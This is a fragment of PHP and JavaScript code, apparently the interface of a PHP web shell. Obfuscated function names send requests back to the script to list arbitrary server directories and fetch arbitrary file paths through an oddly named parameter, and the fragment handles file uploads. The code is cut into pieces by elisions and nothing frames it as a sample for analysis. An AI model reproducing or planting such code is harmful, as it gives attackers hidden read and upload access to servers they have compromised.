...
<tr>
    ...
    <script>
        ...
        function xxqwtxx(dir) {
            ...
            xhr.open("GET","<?php echo $_SERVER['PHP_SELF']; ?>?node=list&kutapercaya="+encodeURIComponent(dir),true);
    ...
    reader.readAsDataURL(file);
        ...
        function xmixinb1(filePath){
            var xhr = new XMLHttpRequest();
            xhr.open("GET","<?php echo $_SERVER['PHP_SELF']; ?>?node=fetch&filepath="+encodeURIComponent(filePath),true);
            xhr.onreadystatechange = function(){
                if(xhr.readyState===4 && xhr.status===200){
